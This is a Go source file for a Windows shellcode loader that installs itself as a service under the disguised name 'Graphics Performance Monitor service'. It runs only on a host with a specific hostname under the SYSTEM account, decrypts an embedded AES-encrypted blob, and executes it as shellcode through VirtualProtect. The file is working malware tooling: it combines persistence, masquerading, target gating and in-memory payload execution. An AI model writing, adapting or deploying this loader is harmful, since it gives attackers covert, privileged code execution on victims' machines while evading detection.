package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"log"
	"os"
	"os/user"

	"github.com/kardianos/service"

	"project/internal/crypto/aes"
	"project/internal/module/shellcode"
)

func main() {
	var (
		install   bool
		uninstall bool
	)
	flag.BoolVar(&install, "install", false, "install service")
	flag.BoolVar(&uninstall, "uninstall", false, "uninstall service")
	flag.Parse()

	svcConfig := service.Config{
		Name:        "Graphics Performance Monitor service",
		DisplayName: "Graphics Performance Monitor service",
		Description: "Graphics performance monitor service",
	}
	svc, err := service.New(new(program), &svcConfig)
	if err != nil {
		log.Fatalln(err)
	}

	switch {
	case install:
		err = svc.Install()
		if err != nil {
			log.Fatalln(err)
		}
	case uninstall:
		err = svc.Uninstall()
		if err != nil {
			log.Fatalln(err)
		}
	default: // run
		lg, err := svc.Logger(nil)
		if err != nil {
			log.Fatalln(err)
		}
		err = svc.Run()
		if err != nil {
			_ = lg.Error(err)
		}
	}
}

func isTarget() bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}
	if hostname != "name" {
		return false
	}
	cUser, err := user.Current()
	if err != nil {
		return false
	}
	if cUser.Username != "NT AUTHORITY\\SYSTEM" {
		return false
	}
	return true
}

type program struct{}

func (p *program) Start(_ service.Service) error {
	if !isTarget() {
		return nil
	}
	scCipherData := "05cefbcddf0ee680639079e3814ab0a8c547600c75079fc7" +
		"4e1874a7815bae0fd97b0d929fcf9c5c6246a59bc9959340ed07acd5a5a1" +
		"6a8bcce33fe2ffd4f5d977f64ecefb4bf0a3f5d2ee390c6580a7e67b8df3" +
		"e7892598866b65015d8cade170428b5320d2f1d38369b9bae230c70b60bb" +
		"bdaf4d33a79139a548f2252c903ffb0d23bb842258797ef26477be9f8193" +
		"596dc8cee073f47228eafd37447d4547541cd8890aaf94006b7b03eb72cf" +
		"78eea86711c0c7b878afd52629b1f5fb139d1b26daf9bdd34a2d997affec" +
		"2220e94d67ce6b730cfea47990856f94147bb1767ae0e3b0a16d6668af8e" +
		"a99d884d70dff031a36a36a4279aed68cab835ab0e1939fba3c6ab994d91" +
		"ced262b28e44df461ddcc0f5bafd83638a1f0fed9b1ed56a"
	cipherData, err := hex.DecodeString(scCipherData)
	if err != nil {
		return err
	}
	hash := sha256.New()
	hash.Write([]byte("test"))
	aesKey := hash.Sum(nil)
	shellCode, err := aes.CBCDecrypt(cipherData, aesKey, aesKey[:aes.IVSize])
	if err != nil {
		return err
	}
	go func() {
		err := shellcode.Execute(shellcode.MethodVirtualProtect, shellCode)
		if err != nil {
			log.Fatalln(err)
		}
	}()
	return nil
}

func (p *program) Stop(_ service.Service) error {
	return nil
}
